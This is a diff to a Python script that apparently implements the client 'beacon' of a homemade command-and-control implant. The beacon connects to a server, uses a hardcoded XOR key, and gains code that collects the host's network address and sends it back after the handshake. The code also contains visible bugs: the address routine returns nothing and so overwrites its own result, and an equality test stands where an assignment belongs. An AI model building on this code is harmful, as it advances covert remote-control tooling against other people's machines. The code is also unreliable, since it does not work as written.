@@ -1,12 +1,12 @@
 #!/usr/bin/python3
 
-import socket,subprocess,time,random
+import socket,subprocess,time,random,psutil
 from Crypto.Util.strxor import strxor
 
 class Beacon:
    #Contains client side behavior and state
 
-   __slots__ = ["sock","running","server_ip","server_port","debugging","key","encryption"]
+   __slots__ = ["sock","running","server_ip","server_port","debugging","key","encryption","local_ip"]
 
    def __init__(self,server_ip,server_port):
       self.running = False
@@ -14,6 +14,7 @@ class Beacon:
       self.server_port = server_port
       self.debugging = True
       self.key = "chandifortnite"
+      self.local_ip = self.detect_local_ip()
 
    def connect(self):
       try:
@@ -26,6 +27,10 @@ class Beacon:
             self.encryption == False
          else:
             raise RuntimeError("Unexpected Network Message Received")
+         if self.encryption == True:
+            self.sock.send(self.encrypt(self.local_ip.encode()))
+         else:
+            self.sock.send(self.local_ip.encode())
       except:
          self.sock.close()
 
@@ -137,7 +142,14 @@ class Beacon:
       return strxor(data,key.encode())
    
    def detect_local_ip(self):
-      pass
+      addrs = psutil.net_if_addrs()  # Get all network interface addresses
+      for interface, addr_list in addrs.items():
+         for addr in addr_list:
+            if addr.family == socket.AF_INET and not addr.address.startswith("127."):  # Skip loopback
+               self.local_ip = addr.address
+               break
+      if self.local_ip == None:
+         self.local_ip = "127.0.0.1"
 
 def main():
    beacon = Beacon("127.0.0.1",10267)
